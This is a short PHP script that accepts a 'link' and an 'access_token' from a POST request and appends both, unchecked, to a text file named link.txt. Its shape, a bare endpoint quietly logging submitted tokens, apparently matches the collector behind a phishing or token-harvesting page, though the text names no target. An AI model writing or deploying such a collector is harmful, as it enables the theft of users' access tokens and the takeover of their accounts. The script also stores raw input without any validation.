<?php
$link = $_POST[link];
$message = $_POST[access_token];
$post = "{$link}-----{$message}";
$openc = fopen("link.txt", "a+");
	fwrite($openc,$post);
	fclose($openc);

?>
